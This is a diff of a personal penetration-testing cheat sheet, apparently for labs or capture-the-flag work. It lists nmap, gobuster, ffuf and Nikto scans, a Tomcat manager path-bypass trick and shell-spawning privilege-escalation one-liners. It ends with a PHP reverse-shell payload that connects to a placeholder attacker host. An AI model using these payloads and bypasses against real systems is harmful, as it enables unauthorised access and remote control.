@@ -8,6 +8,7 @@
 - [BurpSuite](#burp)
 - [Gobuster](#gobuster)
 - [FFUF](#ffuf)
+- [Nikto](#nikto)
 - [Privilege escalation](#privilegeescalation)
 - [Mysql](#mysql)
 - [Hydra](#hydra) - Brute force attack on ssh
@@ -15,6 +16,8 @@
 - [Cewl](#cewl) - It is use to create a worldlist using website link
 - [netcat](#nc)
 
+
+# Enumeration
 - ## Nmap <a name="nmap"></a>
 - ```nmap -sC -sV -vv -oA nmap/report.txt <ip>```
 - ```sudo nmap -Pn -A -p- -T4 <ip> -o nmap.txt```
@@ -24,22 +27,20 @@
   - if you detect new port for example: 8080 then you need to config your proxy in firefox set ```HTTP proxy 192.168.208.189``` and ```port 3128```
   - then only you can viste the website http://192.168.208.189:8080
 
-- ## Burp Suite <a name="burp"></a>
-- use ```/manager/html``` or ```/..;/manager/html``` in the middel of ```GET/ HTTP/1.1```
-  - so it will like this ```GET/ /..;/manager/html HTTP/1.1```
-  - whenever you see JSESSIONID=.... use this.
- 
-- use ```[]==``` for the password if you don't know the pass 
- 
+
 - ## Gobuster <a name="gobuster"></a>
 - ```gobuster dir -u <url> -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt```
 -  ```gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.60.132 -t 50 -x php,txt -o  gobuster.txt```  
+
 
 - ## FFUF <a name="ffuf"></a>
 - FFUF is used to filter the invalid pages 
 - ```ffuf -u <url>/FUZZ -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt```
 - ```ffuf -u <url>/FUZZ -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -r -fs 27200```
   - if you are getting the size same of all use filter size and give the size there.
+
+- ## Nikto <a name="nikto"></a>
+- ```nikto -h http://127.0.0.1```
  
 - ## Privilege escalation <a name="privilegeescalation"></a>
 - ```python3 -c 'import os; os.system("/bin/bash")'```
@@ -91,6 +92,14 @@
   - then use the below command it will give you the root privilege
   - ```sudo perl -e 'exec "/bin/bash";'```
 
+
+ - ## Burp Suite <a name="burp"></a>
+- use ```/manager/html``` or ```/..;/manager/html``` in the middel of ```GET/ HTTP/1.1```
+  - so it will like this ```GET/ /..;/manager/html HTTP/1.1```
+  - whenever you see JSESSIONID=.... use this.
+ 
+- use ```[]==``` for the password if you don't know the pass 
+
 - ## Mysql <a name="mysql"></a>
 - ```mysql -u root -p -h $ip```
 
@@ -113,9 +122,14 @@
 - ## Cewl <a name="cewl"></a>
 - ```cewl -w passwords.txt http://192.168.245.48:1898/?q=node/1```
 
+
+
 - ## netcat <a name="nc"></a>
 ```php
 <?php
  exec("/bin/bash -c 'bash -i >& /dev/tcp/attackerip/553 0>&1'");
 ?>
 ```
+
+
+
